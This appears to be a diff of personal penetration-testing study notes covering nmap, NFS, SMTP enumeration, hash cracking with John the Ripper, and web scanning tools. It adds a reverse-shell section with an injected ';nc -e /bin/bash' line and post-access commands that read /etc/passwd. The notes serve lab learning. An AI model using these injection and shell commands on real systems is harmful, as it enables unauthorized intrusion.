@@ -32,7 +32,7 @@ To create a disk image run the following command:
 qemu-img create -f qcow2 disk.qcow2 64G
 ```
 
-The VM can be executed with a bashscript (remove Image.iso with the distro image of your choice):
+The VM can be executed with a bash script (remove Image.iso with the distro image of your choice):
 ```bash
 #!/bin/bash
 
@@ -82,7 +82,8 @@ Checks open ports in defined range and check running services with ```Nmap```:
 $ nmap 10.10.221.8 -sV -p 0-60000
 ```
 ```text
-*(-p   = Specific port or portrange
+*(-p-  = Scans the whole portrange
+  -p   = Specific port or portrange
   -sV  = Attempts to determine the version of the service running on port
   -A   = Enables OS detection, version detection, script scanning and traceroute)
 ```
@@ -131,7 +132,7 @@ $ sudo mount -t nfs IP:share /tmp/mount/ -nolock
 ```
 
 ### SMTP
-There a three relevant commands, when it comes to ```SMTP```:
+There are three relevant commands, when it comes to ```SMTP```:
 ```text
 (VRFY    = Confirming the names of valid users
  EXPN    = Reveals the actual address of user’s aliases and lists of e-mail (mailing lists)
@@ -193,14 +194,16 @@ We can pipe the hash in a file:
 ```bash
 $ echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt
 ```
-And crack the password with ```John the Ripper``` (In ```Kali``` the bash has some problem to execute the package, so we do it by our self):
+And crack the password with ```John the Ripper```:
 ```bash
 $ john hash.txt
+$ john --show --format=RAW-MD5 hash.txt
 ```
-or
-```bash
-$ /usr/sbin/john hash.txt
+```text
+*(--show            = show cracked passwords
+  --format=<param>  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt
 ```
+
 
 ## Web Fundamentals
 
@@ -214,3 +217,40 @@ $ curl -X GET http://10.10.4.59:8081/ctf/post
   [target]          = The URL of the webpage we want to fetch
   -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)
 ```
+
+```CEWL``` password list generator.
+
+```WPSCAN``` scans the Word Press version.
+
+```Gobuster``` is a tool used to brute-force URIs including directories and files as well as DNS subdomains.
+
+```DIRB``` is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects.
+
+### Reverse Shell
+
+```shell
+$ ;nc -e /bin/bash
+```
+
+For more information checkout the following GitHub repo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+If you gain access depending on the OS you can try the following commands to get more information:
+>Linux
+```shell
+  $ whoami
+  $ id
+  $ ifconfig/ip addr
+  $ uname -a                  # print system information
+  $ ps -ef                    # -e = select all processes  -f = do full-format listing
+  $ less /etc/passwd          # usernames with UID, GID, GECOS, home directory and login shell
+  $ cut -d: -f1 /etc/passwd   # only usernames
+  $ cat /etc/os-release       # Get inforamtion about the OS and the OS version
+```
+>Windows
+```shell
+  $ whoami
+  $ ver
+  $ ipconfig
+  $ tasklist
+  $ netstat -an
+  ```
